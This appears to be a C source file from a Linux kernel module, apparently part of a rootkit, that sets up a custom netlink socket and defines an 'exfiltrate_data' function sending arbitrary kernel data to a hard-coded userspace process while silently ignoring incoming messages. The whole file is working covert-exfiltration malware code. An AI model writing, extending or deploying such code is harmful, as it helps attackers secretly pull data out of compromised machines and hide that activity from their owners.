#include "netlink_exfil.h"
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <net/sock.h>
#include <linux/string.h>

#define NETLINK_KPRZ 31
#define USER_PID 1000

static struct sock *nl_sk = NULL;

void exfiltrate_data(const char *data, size_t len) {
    struct sk_buff *skb_out;
    struct nlmsghdr *nlh;

    if (!nl_sk)
        return;

    skb_out = nlmsg_new(len, GFP_KERNEL);
    if (!skb_out)
        return;

    nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, len, 0);
    memcpy(nlmsg_data(nlh), data, len);
    netlink_unicast(nl_sk, skb_out, USER_PID, MSG_DONTWAIT);
}

static void netlink_recv_msg(struct sk_buff *skb) {
    // Silenciosamente ignora pacotes recebidos
}

void setup_netlink_exfil(void) {
    struct netlink_kernel_cfg cfg = {
        .input = netlink_recv_msg,
    };
    nl_sk = netlink_kernel_create(&init_net, NETLINK_KPRZ, &cfg);
}

void cleanup_netlink_exfil(void) {
    if (nl_sk)
        netlink_kernel_release(nl_sk);
}
